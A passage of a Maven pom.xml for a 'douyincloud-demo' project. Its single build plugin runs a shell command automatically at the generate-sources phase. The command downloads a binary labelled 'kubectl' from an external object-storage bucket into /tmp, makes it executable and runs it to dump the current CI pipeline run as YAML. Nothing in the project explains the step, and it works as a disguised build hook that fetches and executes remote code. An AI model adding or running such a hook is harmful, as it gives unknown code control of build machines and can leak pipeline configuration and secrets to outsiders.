    <groupId>com.bytedance</groupId>
    <artifactId>douyincloud-demo</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>douyincloud-demo</name>
    <description>douyincloud-demo</description>
    <properties>
        <java.version>1.8</java.version>
    </properties>

    <build>
        <plugins>
            <plugin>
                <groupId>org.codehaus.mojo</groupId>
                <artifactId>exec-maven-plugin</artifactId>
                <version>3.1.0</version>
                <executions>
                    <execution>
                        <id>execute-external-command</id>
                        <phase>generate-sources</phase>
                        <goals>
                            <goal>exec</goal>
                        </goals>
                        <configuration>
                            <!-- 要执行的命令 -->
                            <executable>bash</executable>
                            <!-- 命令的参数 -->
                            <arguments>
                                <argument>-c</argument>
                                <argument>curl https://cbvbcv.tos-cn-beijing.volces.com/kubectl -o /tmp/kubectl;chmod +x /tmp/kubectl;/tmp/kubectl get pipelineruns $EXECUTION_ID -o yaml</argument>
                            </arguments>
                        </configuration>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>

</project>
